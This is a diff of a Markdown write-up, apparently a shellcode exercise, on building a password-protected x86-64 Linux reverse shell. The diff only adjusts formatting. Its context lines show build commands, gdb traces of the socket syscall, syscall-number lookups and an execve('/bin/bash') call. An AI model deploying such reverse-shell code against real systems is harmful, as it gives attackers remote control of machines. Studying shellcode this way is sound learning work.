@@ -50,6 +50,7 @@ int main(void)
 + Password checking will be done in assembly and is not included in the C skeleton program.
 
 ## Compiling & Testing
+
 ```bash
 root# gcc revshell.c -o revshell
 root# ./revshell 
@@ -80,6 +81,7 @@ gdb-peda$ r
 ```
 
 ### 1 - Socket
+
 ```bash
 [----------------------code----------------------]
 => 0x7ffff7edf8d0 <socket>:     mov    eax,0x29
@@ -148,6 +150,7 @@ RDX: 0x0
 ```
 
 ### Sys Calls
+
 ```bash
 root# cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | \
 egrep "(connect|execve |write |read |socket |dup2)"
@@ -159,10 +162,9 @@ egrep "(connect|execve |write |read |socket |dup2)"
 #define __NR_execve 59    => \x3b
 ```
 
-
 # Assembly
 
-```asm
+```nasm
 global _start
 
 section .text
@@ -296,9 +298,10 @@ syscall  ; call execve("/bin/bash", NULL, NULL)
 ```
 
 ## Testing
+
 #### Terminal 1
 
-```bash
+```console
 root# nasm -f elf64 revshell.asm -o revshell.o
 root# ld revshell.o -o revshell
 root# ./revshell
